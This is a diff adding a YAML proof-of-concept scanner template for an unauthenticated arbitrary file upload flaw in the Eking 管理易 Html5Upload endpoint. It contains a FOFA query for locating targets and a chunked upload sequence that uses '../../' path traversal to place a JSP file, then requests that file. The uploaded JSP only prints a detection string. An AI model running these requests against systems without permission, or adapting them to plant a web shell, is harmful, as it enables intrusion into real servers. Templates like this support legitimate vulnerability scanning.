@@ -1,0 +1,69 @@
+id: poc-yaml-ekingcn-html5upload-upload
+info:
+  name: Eking管理易 Html5Upload 前台任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: EKing-管理易
+  fofa: app="EKing-管理易"
+variables:
+  t1: random_int(100,1000)
+requests:
+- method: POST
+  path: /Html5Upload.ihtm
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: comm_type=INIT&sign_id=123456&vp_type=default&file_name=../../test{{.t1}}.jsp&file_size=2048
+  expression: "status_code == 200 && \ncontains(find_json(body,\"status\"), \"OK\"\
+    )\n"
+- method: POST
+  path: /Html5Upload.ihtm
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR
+  data: '------WebKitFormBoundaryj7OlOPiiukkdktZR
+
+    Content-Disposition: form-data; name="comm_type"
+
+
+    DATA
+
+    ------WebKitFormBoundaryj7OlOPiiukkdktZR
+
+    Content-Disposition: form-data; name="sign_id"
+
+
+    123456
+
+    ------WebKitFormBoundaryj7OlOPiiukkdktZR
+
+    Content-Disposition: form-data; name="data_inde"
+
+
+    0
+
+    ------WebKitFormBoundaryj7OlOPiiukkdktZR
+
+    Content-Disposition: form-data; name="data"; filename="chunk1"
+
+    Content-Type: application/octet-stream
+
+
+    <% out.println("This website has a vulnerability");%>
+
+    ------WebKitFormBoundaryj7OlOPiiukkdktZR--
+
+    '
+  expression: "status_code == 200 && \ncontains(find_json(body,\"status\"), \"OK\"\
+    )\n"
+- method: POST
+  path: /Html5Upload.ihtm
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: comm_type=END&sign_id=123456&file_name=../../test{{.t1}}.jsp
+  expression: "status_code == 200 && \ncontains(find_json(body,\"status\"), \"OK\"\
+    ) &&\ncontains(find_json(body,\"fileUrl\"), \"/upload2/\")\n"
+- method: GET
+  path: /test{{.t1}}.jsp
+  expression: "status_code == 200 && \ncontains(body,\"This website has a vulnerability\"\
+    )\n"
+transport: http
